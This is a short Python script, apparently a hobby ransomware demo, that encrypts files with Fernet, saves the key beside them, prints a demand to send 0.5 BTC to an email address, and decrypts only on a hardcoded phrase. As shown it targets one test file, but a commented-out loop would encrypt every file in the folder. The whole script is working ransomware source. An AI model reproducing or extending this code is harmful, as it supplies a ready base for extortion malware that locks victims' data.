#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Feb 13 12:16:21 2023

@author: aaryeanaik
"""



#import os
from cryptography.fernet import Fernet

files = ['test.txt']

#collecting all listed files in a single list

#for file in os.listdir():
#  if file == "ransomware.py" or file == 'thekey.key' or file == 'decrypt.py':
#    continue
#  if os.path.isfile(file):
#      files.append(file)
      
print(files)

#creating encryption key

key = Fernet.generate_key()

#saving key

with open('thekey.key', 'wb') as thekey:
          thekey.write(key)

#encrypting files          
          
for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(encrypted_contents)
        

print("Your files have been encrypted!\n\nSend 0.5 BTC to aaryea@outlook.com to recover your lost files!")



secretphrase = "Tron"    



def decryption_prompt():
    userphrase = input("Enter the phrase to decrypt your files\n")

    if userphrase == secretphrase:  
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                decrypted_contents = Fernet(key).decrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(decrypted_contents)
                    print("Your files have been decrypted! have a good day.")
    else:
        print("Sorry, wrong phrase. skill issue.\n")
        decryption_prompt()

decryption_prompt()
    